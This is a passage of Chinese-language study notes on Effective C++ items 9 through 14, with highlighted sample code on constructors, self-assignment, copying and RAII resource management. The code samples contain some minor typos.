punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token comment">//记录访问历史</span>      <span class="token comment">//消化异常或者主动关闭</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ul><p>总结：</p><ul><li>不要让异常从析构函数里跑出来。如果析构函数的某些代码可能会抛出异常，要保证它们能在跑出析构函数之前被catch块接到，然后选择消化异常还是终止程序。</li><li>可以把可能抛出异常的代码从析构函数中移到别的函数里，这样就可以事先对异常做出反应。</li></ul><h2 id="条款9-不要在构造函数和析构函数中调用虚函数"><a href="#条款9-不要在构造函数和析构函数中调用虚函数" class="headerlink" title="条款9 不要在构造函数和析构函数中调用虚函数"></a>条款9 不要在构造函数和析构函数中调用虚函数</h2><p>考虑如下情况<br><pre class="language-c" data-language="c"><code class="language-c">class Transaction<span class="token punctuation">&#123;</span>                              <span class="token comment">//股市交易的基类</span>  public<span class="token operator">:</span>    <span class="token function">Transaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    virtual <span class="token keyword">void</span> <span class="token function">logTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span> <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>     <span class="token comment">//该函数用来记录交易历史，是一个纯虚函数</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Transaction<span class="token operator">::</span><span class="token function">Transaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token function">logTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                             <span class="token comment">//在基类的构造函数中调用了这个纯虚函数</span><span class="token punctuation">&#125;</span></code></pre><br>同时又有表示”买进”和”卖出”的类，继承自以上的”交易”:<br><pre class="language-c" data-language="c"><code class="language-c">class BuyTransaction <span class="token operator">:</span> public Transaction<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    virtual <span class="token keyword">void</span> <span class="token function">logTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class SellTransaction <span class="token operator">:</span> public Transaction<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    virtual <span class="token keyword">void</span> <span class="token function">logTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>假设在某处定义一个“买进”类的对象：<br><pre class="language-c" data-language="c"><code class="language-c">BuyTransaction b<span class="token punctuation">;</span></code></pre><br>显然这里调用了”BuyTransaction”的构造函数。但因为在C++中，当子类开始构造时，它所包含的父类的部分要先完成构造，所以率先调用的构造函数是它的父类”Transaction”的构造函数。现在问题来了，因为父类的构造函数调用了一个纯虚函数，这就会导致即使创建的是它的子类对象，这个虚函数也不会绑定到子类的版本上，而是使用的父类版本。</p><p>这就”有悖常理”了，虚函数不是会自动绑定到继承层级里对应的一个类吗？其实C++这样做是有一个很好的原因的。在条款四中提到，使用未初始化的数据可能会给程序带来风险。因为在创建一个子类对象时，它的父类部分会先被创建。当父类的构造函数刚刚调用完成时，可以只能保证父类部分的数据被初始化，而不能保证衍生部分的被初始化。如果现在让这个虚函数去对应子类的版本，就可能会因为使用未初始化的数据而导致程序运行时错误。</p><p>事实上，正是由于这个原因，当一个子类对象在完成它自己全部成员的构造之前，C++只会把它当成父类，除了虚函数还包括typeid，dynamic_cast等，都会把当前对象当做父类，用来规避使用未初始化数据可能带来的风险。</p><p>同样的原理，也不要让析构函数调用虚函数。在条款7讲过，析构函数的调用顺序是从子类到父类，与构造函数的调用顺序是相反的。当子类部分的成员数据被删除时，C++同样会把当前的对象认为是父类，如果这时调用了虚函数，也会导致错误版本的虚函数被调用。</p><p>实际上这样在构造函数或者析构函数里直接调用虚函数，在某些编译器中是会发出警告的。不过即使无视掉这些警告，因为调用的是一个纯虚函数，通常是不会有定义的，所以在之后的链接过程中，链接器也会报错。</p><p>但如下的代码做了完全一样的事，编译器和链接器却都不会发出警告或报错。这样的代码相比前面的就更具有潜在危害性:<br><pre class="language-c" data-language="c"><code class="language-c">class Transaction<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    <span class="token function">Transaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>                  <span class="token comment">//调用了一个专门的init()函数</span>    virtual <span class="token keyword">void</span> logTransaction <span class="token keyword">const</span> <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  private<span class="token operator">:</span>    <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                              <span class="token comment">//这个函数不是虚函数，而且有定义</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                                     <span class="token comment">//编译器和链接器就都不会报错</span>      <span class="token function">logTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment">//但里面却包含了虚函数的代码</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>即使init()函数有定义而且不是虚函数，它却调用了没有定义的纯虚函数logTransaction()，这就会导致在运行过程中，一旦使用了这里的代码，程序就会崩溃。</p><p>就算logTransaction()函数是一个有定义的”普通的”虚函数，即没有”=0”关键字来修饰，程序虽然不会因为缺少定义而闪退，但却一样会在子类的构造过程中调用错误版本的虚函数。所以万全的解决方法就是，不管是纯虚的还是普通的，就不要在构造或者析构函数中调用虚函数。</p><p>但如果一定想要对象在初始化的时候完成某些任务呢？那可以就需要在父类Transaction中，把虚函数logTransaction去掉virtual关键字，变成普通的函数，然后在子类构造过程中，把某些信息传递到父类的构造函数中。<br><pre class="language-c" data-language="c"><code class="language-c">class Transaction<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    explicit <span class="token function">Transaction</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string<span class="token operator">&amp;</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//explicit关键字用来防止隐式转换</span>    <span class="token keyword">void</span> <span class="token function">logTransaction</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string<span class="token operator">&amp;</span> info<span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">;</span> <span class="token comment">//增加一个传递参数，就可以从子类获得信息了</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Transaction<span class="token operator">::</span><span class="token function">Transaction</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string<span class="token operator">&amp;</span> info<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token function">logTransaction</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><br>现在就可以在子类对象中如下定义构造函数了，这样就能把子类的信息传递到父类中，让父类构造函数去完成子类构造函数想做的事：<br><pre class="language-c" data-language="c"><code class="language-c">class BuyTransaction <span class="token operator">:</span> public Transaction<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    <span class="token function">BuyTransaction</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">Transaction</span><span class="token punctuation">(</span><span class="token function">createLog</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  private<span class="token operator">:</span>    <span class="token keyword">static</span> std<span class="token operator">::</span>string <span class="token function">createLog</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>这里createLog()就是一个辅助函数(helper function)，用来将某函数的一部分功能封装成另一个小函数，减少代码的复杂性，使代码更加可读。此外，因为这是一个子类的私有成员，父类构造函数被调用时不能保证它被初始化，所以使用static关键字可以避免意外使用了未初始化的成员数据。</p><p>总结：</p><ul><li>不要在构造函数或者析构函数中调用虚函数，因为这样的虚函数只会对应起来当前构造或析构的类，不会上升到它的任何子类。</li></ul><h2 id="条款10-赋值操作符返回-this的引用"><a href="#条款10-赋值操作符返回-this的引用" class="headerlink" title="条款10 赋值操作符返回*this的引用"></a>条款10 赋值操作符返回*this的引用</h2><p>c++中有如下用法：<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> x <span class="token punctuation">,</span> y <span class="token punctuation">,</span> z<span class="token punctuation">;</span>x <span class="token operator">=</span> y <span class="token operator">=</span> z <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span><span class="token comment">//上述代码会被编译器从最右开始解析</span>x <span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">=</span> <span class="token punctuation">(</span>z <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><br>对于自定义的类，赋值操作符应遵循如下两点规则:</p><ul><li>返回类型是当前类的引用</li><li>返回*this给左边的变量</li></ul><p>这个规则对+=, -=, *=等操作符同样适用。C++的自有类型，例如int, double，标准库的类型，例如std::string, std::complex，它们的赋值操作符都遵循这样的规则。</p><p>关于this，this是用来指向当前对象的指针，只存在于类的成员函数里，用来防止成员数据和成员函数参数的歧义:</p><pre class="language-c" data-language="c"><code class="language-c">class MessageBox<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    <span class="token function">MessageBox</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string<span class="token operator">&amp;</span> message<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  private<span class="token operator">:</span>    std<span class="token operator">::</span>string<span class="token operator">&amp;</span> message<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>MessageBox<span class="token operator">::</span><span class="token function">MessageBox</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string<span class="token operator">&amp;</span> message<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  this <span class="token operator">-></span> message <span class="token operator">=</span> message<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>这里MessageBox类有一个数据成员叫message，同时它的构造函数也有一个参数叫message，此时为了避免歧义，可以用this-&gt;message来代表当前类的message成员。</p><p>总结：</p><ul><li>赋值操作符应返回一个指向*this的引用</li></ul><h2 id="条款11-在operator-中处理自我赋值（self-assingment）"><a href="#条款11-在operator-中处理自我赋值（self-assingment）" class="headerlink" title="条款11 在operator= 中处理自我赋值（self assingment）"></a>条款11 在operator= 中处理自我赋值（self assingment）</h2><p>自我赋值：<br><pre class="language-c" data-language="c"><code class="language-c">class Widget<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Widget w<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>w <span class="token operator">=</span> w<span class="token punctuation">;</span>             <span class="token comment">//自赋值</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token comment">//如果i==j,那么这行代码也构成自赋值</span><span class="token operator">*</span>px <span class="token operator">=</span> <span class="token operator">*</span>py<span class="token punctuation">;</span>         <span class="token comment">//如果px和py指向了同一个对象，这行代码也构成自赋值</span></code></pre><br>以上的情况都是别名(aliasing)的后果，即某个对象可以通过多于一个符号名被访问，比如上面px和py如果被声明为同一个类型，它们就可以同时可以指向同一个对象。但在一个继承层级中，即使两个对象被声明为了不同的类型，别名依然可能发生，因为基类指针或者引用可以指向任何一个它的子类，例如:</p><pre class="language-c" data-language="c"><code class="language-c">class Base<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class Derived <span class="token operator">:</span> public Base<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>               <span class="token comment">//同一个继承层级中</span><span class="token keyword">void</span> <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token keyword">const</span> Base<span class="token operator">&amp;</span> rb<span class="token punctuation">,</span> Derived<span class="token operator">*</span> pd<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//rb与pd就可能指向同一个对象</span></code></pre><p>如果要手动管理资源而不使用资源管理类的话(resource managing class，见第13章)，的赋值操作符就可能不是自赋值安全的(self-assignment-safe):</p><p>考虑如下代码：<br><pre class="language-c" data-language="c"><code class="language-c">class Bitmap<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>class Widget<span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  private<span class="token operator">:</span>    Bitmap <span class="token operator">*</span>bp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Widget<span class="token operator">&amp;</span> Widget<span class="token operator">::</span>operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> Widget<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  delete pb<span class="token punctuation">;</span>  pb <span class="token operator">=</span> new <span class="token function">Bitmap</span><span class="token punctuation">(</span><span class="token operator">*</span>rhs<span class="token punctuation">.</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">*</span>this<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><br>如果传入的参数rhs本身，就会导致delete语句把*this自己的资源释放掉，同时也释放掉了rhs的资源，最后返回的*this包含了一个损坏的数据，不能访问不能修改，甚至不能通过delete来为其释放资源，等于说这段空间就凭空消失了，所以这段代码不是自赋值安全的。</p><p>解决方法：</p><ul><li>1 检查传入的参数是不是*this<pre class="language-c" data-language="c"><code class="language-c">Widget<span class="token operator">&amp;</span> Widget<span class="token operator">::</span>operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> Widget<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>this <span class="token operator">==</span> <span class="token operator">&amp;</span>rhs<span class="token punctuation">)</span>             <span class="token comment">//先做一个身份检测</span>    <span class="token keyword">return</span> <span class="token operator">*</span>this<span class="token punctuation">;</span>  delete pb<span class="token punctuation">;</span>                   <span class="token comment">//如果不是自己，再执行如下操作</span>  pb <span class="token operator">=</span> new <span class="token function">Bitmap</span><span class="token punctuation">(</span><span class="token operator">*</span>this<span class="token punctuation">.</span>pb<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">*</span>this<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>但是这个方法有个问题，当执行完delete，执行new语句时抛出异常，会导致*this储存了一个损坏的数据。</li><li>2 重新排列语句<pre class="language-c" data-language="c"><code class="language-c">Widget<span class="token operator">&amp;</span> Widget<span class="token operator">::</span>operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> Widget<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  Bitmap <span class="token operator">*</span>pOrigin <span class="token operator">=</span> pb<span class="token punctuation">;</span>            <span class="token comment">//先保存一个原pb的备份</span>  pb <span class="token operator">=</span> new <span class="token function">Bitmap</span><span class="token punctuation">(</span><span class="token operator">*</span>this<span class="token punctuation">.</span>pb<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//拷贝过来rhs的pb</span>  delete pOrigin<span class="token punctuation">;</span>                  <span class="token comment">//只删除备份</span>  <span class="token keyword">return</span> <span class="token operator">*</span>this<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>这条解决方法既对自赋值安全，对异常也是安全的。如果现在new的这行抛出了异常，指针pb也不会被提前删除。同时这样的语句排列省去了上一条解决方法身份检测的步骤，因为即使传入的rhs是*this本身，最后删除的也只是备份而不是*this自己的pb。</li><li>3 先拷贝再调换<pre class="language-c" data-language="c"><code class="language-c">class Widget<span class="token punctuation">&#123;</span>   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span>Widget<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//把rhs和*this的数据成员互相调换</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Widget<span class="token operator">&amp;</span> widget<span class="token operator">::</span>operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> Widget<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  Widget <span class="token function">temp</span><span class="token punctuation">(</span>rhs<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//拷贝rhs</span>  <span class="token function">swap</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">//将*this的数据与这个拷贝的数据调换</span>  <span class="token keyword">return</span> <span class="token operator">*</span>this<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//还可以使用另一种形式</span>Widget<span class="token operator">&amp;</span> Widget<span class="token operator">::</span><span class="token function">operator</span><span class="token punctuation">(</span>Widget rhs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">swap</span><span class="token punctuation">(</span>rhs<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">*</span>this<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>这样的代码虽然可能违反了函数要使用常量引用传递的惯例，但这样做确实能减少源代码和目标代码的长度，增加了效率。</li></ul><p>总结：</p><ul><li>赋值操作符要考虑到自赋值，使用参数身份检测，排列语句，先拷贝再调换的方法来确保代码是自赋值安全的。</li><li>同样当一个函数使用多个参数时，也要确保函数能在这些参数同时指向同一个对象时可以工作正常。</li></ul><h2 id="条款12-完整拷贝对象"><a href="#条款12-完整拷贝对象" class="headerlink" title="条款12 完整拷贝对象"></a>条款12 完整拷贝对象</h2><p>C++有两种拷贝函数(copying function): 拷贝构造函数(copy constructor)和拷贝赋值操作符(copy assignment operator)。如果在自己定义的类中不声明这些拷贝函数，编译器会自动为你生成。如果我们声明了自己的拷贝函数，程序将会执行我们自己的拷贝函数。</p><p>查看以下例子：<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">logCall</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string<span class="token operator">&amp;</span> funcName<span class="token punctuation">)</span><span class="token punctuation">;</span>class Customer<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token function">Customer</span><span class="token punctuation">(</span><span class="token keyword">const</span> Customer<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">;</span>    Customer<span class="token operator">&amp;</span> operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> Customer<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">;</span>  private<span class="token operator">:</span>    std<span class="token operator">::</span>string name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Customer<span class="token operator">::</span><span class="token function">Customer</span><span class="token punctuation">(</span><span class="token keyword">const</span> Customer<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">name</span><span class="token punctuation">(</span>rhs<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token comment">//使用初始化列表</span>  <span class="token function">logCall</span><span class="token punctuation">(</span><span class="token string">"Customer copy constructor"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>Customer<span class="token operator">&amp;</span> Customer<span class="token operator">::</span>operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> Customer<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">logCall</span><span class="token punctuation">(</span><span class="token string">"Customer copy assignment operator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  name <span class="token operator">=</span> rhs<span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token comment">//拷贝数据</span>  <span class="token keyword">return</span> <span class="token operator">*</span>this<span class="token punctuation">;</span>       <span class="token comment">//返回*this，见第10章</span><span class="token punctuation">&#125;</span></code></pre><br>如果新增一个数据成员：<br><pre class="language-c" data-language="c"><code class="language-c">class Date<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class Cutomer<span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  private<span class="token operator">:</span>    std<span class="token operator">::</span>string name<span class="token punctuation">;</span>    Data lastTransaction<span class="token punctuation">;</span>     <span class="token comment">//新增了一个交易日期的数据成员</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>如果依然使用相同的两种拷贝函数，只能得到一个部分拷贝对象。</p><p>C++的这两种拷贝函数有相似的功能和代码，如果想要节省代码，可以写另一个函数来给每个成员赋值，一般叫做init()</p><p>总结：</p><ul><li>拷贝函数要照顾到类的所有部分，包括所有的数据成员和它的基类部分</li><li>不要用一个拷贝函数来实现另一个拷贝函数，两种拷贝函数的语义不同。如果要节省代码，可以另写一个init()函数让两个拷贝函数来调用。</li></ul><h1 id="资源管理"><a href="#资源管理" class="headerlink" title="资源管理"></a>资源管理</h1><h2 id="条款13-用对象来管理资源"><a href="#条款13-用对象来管理资源" class="headerlink" title="条款13  用对象来管理资源"></a>条款13  用对象来管理资源</h2><p>资源是一个很宽泛的概念，但总体来讲，资源是我们可以用来使用，并且使用完之后要返还给系统的东西。在C++中，资源多数是指动态分配的内存。如果你只用new来分配内存却不在使用完后delete掉，将会导致内存泄漏。</p><p>其他资源比如文件描述符(file descriptor)，Mutex锁，GUI中的字体(font)和画刷(brush)，网络接口(socket)，但不论资源是什么，我们一定要保证在使用过后要及时释放，否则就会造成资源泄露。当我们的代码变得越来越复杂，比如增加了异常抛出，函数不同的返回路径，手动管理资源将会变得费时费力，因此我们需要用对象来管理资源。</p><p>假设我们在为不同类型的投资写一个库:<br><pre class="language-c" data-language="c"><code class="language-c">class Investment<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token comment">//Investment继承层级的基类</span>Investment<span class="token operator">*</span> <span class="token function">createInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//返回一个动态分配的Investment层级对象指针</span></code></pre><br>返回一个指针就说明我们要负责在用毕后及时释放资源:<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  Intestment<span class="token operator">*</span> pInv <span class="token operator">=</span> <span class="token function">createInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//分配</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                                    <span class="token comment">//使用</span>  delete pInv<span class="token punctuation">;</span>                           <span class="token comment">//释放</span><span class="token punctuation">&#125;</span></code></pre><br>如果中间部分存在并触发了一个return语句，最后的delete语句便会被跳过。如果用在循环里，中间存在并触发了break或goto语句，delete也不会被执行。同样如果中间的代码抛出了异常，这个指针也不会被删除掉。如果这个动态分配的对象没有被清理掉，不仅仅是它占用的内存资源泄露，它所占有的所有资源也将泄露。</p><p>解决方法：<br>使用引用计数的智能指针(Reference-Counting Smart Pointer, RCSP)，它在运行时会统计有多少对象指向当前的资源，然后当没有任何对象指向当前资源时便会自动释放，shared_ptr可以在STL容器中使用。<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  std<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>Investment<span class="token operator">></span> <span class="token function">pInv</span><span class="token punctuation">(</span><span class="token function">createInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>  <span class="token comment">//无需手动释放</span>std<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>Investment<span class="token operator">></span> <span class="token function">pInv1</span><span class="token punctuation">(</span><span class="token function">createInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>std<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>investment<span class="token operator">></span> <span class="token function">pInv2</span><span class="token punctuation">(</span>pInv1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//pInv1保持不变</span>pInv1 <span class="token operator">=</span> pInv2<span class="token punctuation">;</span>                                  <span class="token comment">//pInv2保持不变</span></code></pre><br>使用智能指针只是用对象管理资源的方法之一，而且也存在着局限性。例如我们不能使用标准库的智能指针来指向一个动态分配的数组。</p><p>总结：</p><ul><li>防止资源泄露，从RAII做起。获取资源在构造过程中，释放资源在析构过程中。</li><li>std::shared_ptr和auto_ptr是两个常用的RAII类。一般情况下std1::shared_ptr是更好的选择，因为它的拷贝不会影响到其它对象，并且支持STL容器。</li></ul><h2 id="条款14-资源管理类的拷贝"><a href="#条款14-资源管理类的拷贝" class="headerlink" title="条款14 资源管理类的拷贝"></a>条款14 资源管理类的拷贝</h2><p>对于堆之外的资源，例如Mutex锁，智能指针就不太好用。<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">lock</span><span class="token punctuation">(</span>Mutex<span class="token operator">*</span> pm<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//锁住pm指向的锁</span><span class="token keyword">void</span> <span class="token function">unlock</span><span class="token punctuation">(</span>Mutex<span class="token operator">*</span> pm<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//解锁pm指向的锁</span></code></pre><br>同时我们有一个符合RAII规范的类来管理这些锁，RAII即获取资源在对象构造过程中，释放资源在对象析构过程中:<br><pre class="language-c" data-language="c"><code class="language-c">class Lock<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    explicit <span class="token function">Lock</span><span class="token punctuation">(</span>Mutex <span class="token operator">*</span>pm<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">mutexPtr</span><span class="token punctuation">(</span>pm<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">lock</span><span class="token punctuation">(</span>mutexPtr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>                             <span class="token comment">//在构造时获取资源，上锁</span>    <span class="token operator">~</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">unlock</span><span class="token punctuation">(</span>mutexPtr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">//在析构时释放资源，解锁</span>private<span class="token 